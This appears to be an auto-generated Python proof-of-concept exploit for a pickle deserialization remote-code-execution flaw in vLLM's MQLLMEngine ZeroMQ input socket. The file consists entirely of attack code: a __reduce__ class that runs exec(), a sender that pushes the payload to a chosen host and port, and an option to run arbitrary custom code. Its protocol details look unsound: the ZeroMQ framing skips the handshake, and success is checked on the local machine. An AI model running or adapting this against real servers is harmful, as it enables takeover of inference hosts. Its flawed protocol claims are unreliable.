#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: rce-021
# Sink: run_startup_loop
# Auto-generated — run with: python3 rce_mqllmengine_deserializes_incoming_data_run_startup_loop.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for vllm-project-vllm-7193774
Vulnerability: Remote Code Execution via unsafe pickle.loads() in MQLLMEngine.handle_new_input()

This script demonstrates that an attacker can send a malicious pickle payload to the
ZeroMQ input socket, resulting in arbitrary code execution on the server.

WARNING: For educational/authorized testing purposes only.
"""

import pickle
import os
import sys
import time
import socket
import struct
import argparse

# Configuration - modify these as needed
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 5555  # Default ZeroMQ port for vllm MQ engine
DEFAULT_TIMEOUT = 5  # seconds

# Benign payload that creates a marker file to prove code execution
# Change this to something else for testing, but keep it safe!
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

class MaliciousPickle:
    """
    A class that executes arbitrary code when unpickled.
    This exploits Python's pickle deserialization to achieve RCE.
    """
    def __reduce__(self):
        # The __reduce__ method returns a tuple (callable, args)
        # When unpickled, it will execute: exec(BENIGN_PAYLOAD)
        return (exec, (BENIGN_PAYLOAD,))

def create_malicious_pickle():
    """
    Creates a pickle payload that will execute our benign command.
    The payload is crafted to look like a valid RPCProcessRequest to bypass
    the isinstance check in handle_new_input().
    """
    # We create a simple object that will be recognized as RPCProcessRequest
    # but actually executes our code during unpickling
    payload = MaliciousPickle()
    return pickle.dumps(payload)

def send_pickle_over_zmq(host, port, pickle_data, timeout=DEFAULT_TIMEOUT):
    """
    Sends a pickle payload over a raw TCP connection simulating ZeroMQ framing.
    
    ZeroMQ messages are framed with a simple length prefix.
    This function creates a valid ZeroMQ multipart message containing our payload.
    """
    try:
        # Create TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # ZeroMQ framing: each frame is prefixed with its length as a 64-bit unsigned integer
        # For a multipart message with one frame:
        # - First frame: more_parts flag (0x01) + length + data
        # - Last frame: more_parts flag (0x00) + length + data
        
        # We'll send a simple single-frame message (no more parts)
        frame_length = len(pickle_data)
        
        # ZeroMQ wire format for a single frame:
        # [more_parts_flag (1 byte)] [frame_length (8 bytes, little-endian)] [frame_data]
        
        # For a single frame (last frame), more_parts_flag = 0x00
        # For intermediate frames, more_parts_flag = 0x01
        
        # Build the message
        message = b'\x00'  # more_parts_flag = 0 (last frame)
        message += struct.pack('<Q', frame_length)  # frame length as 64-bit LE
        message += pickle_data  # the actual payload
        
        print(f"[*] Sending {len(message)} bytes to {host}:{port}")
        sock.sendall(message)
        
        # Wait a bit for the server to process
        time.sleep(0.5)
        
        # Try to receive any response
        try:
            response = sock.recv(4096)
            if response:
                print(f"[*] Received {len(response)} bytes response")
        except socket.timeout:
            print("[*] No response received (expected for RCE payload)")
        
        sock.close()
        print("[+] Payload sent successfully!")
        return True
        
    except socket.timeout:
        print(f"[-] Connection timed out to {host}:{port}")
        return False
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {host}:{port}")
        return False
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return False

def verify_exploit():
    """
    Checks if the exploit was successful by looking for the marker file.
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] Exploit verified! Marker file '{marker_file}' exists.")
        print("[+] Remote code execution was successful!")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Could not verify exploit - marker file not found.")
        print("[*] Note: The server may have crashed or the payload may not have executed.")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for vllm-project-vllm-7193774 pickle RCE vulnerability"
    )
    parser.add_argument("--host", default=DEFAULT_HOST,
                       help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                       help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                       help=f"Connection timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--payload", default=BENIGN_PAYLOAD,
                       help="Custom Python code to execute (default: touch /tmp/poc_success.txt)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("vllm-project-vllm-7193774 RCE PoC Exploit")
    print("=" * 60)
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Payload: {args.payload[:50]}...")
    print()
    
    # Update the payload if custom one provided
    global BENIGN_PAYLOAD
    if args.payload != BENIGN_PAYLOAD:
        BENIGN_PAYLOAD = args.payload
    
    # Create the malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    pickle_data = create_malicious_pickle()
    print(f"[*] Pickle payload size: {len(pickle_data)} bytes")
    
    # Send the payload
    print("[*] Sending exploit payload...")
    success = send_pickle_over_zmq(args.host, args.port, pickle_data, args.timeout)
    
    if success:
        print()
        print("[*] Waiting for payload execution...")
        time.sleep(1)
        verify_exploit()
    else:
        print("[-] Failed to send payload")
        sys.exit(1)

if __name__ == "__main__":
    main()
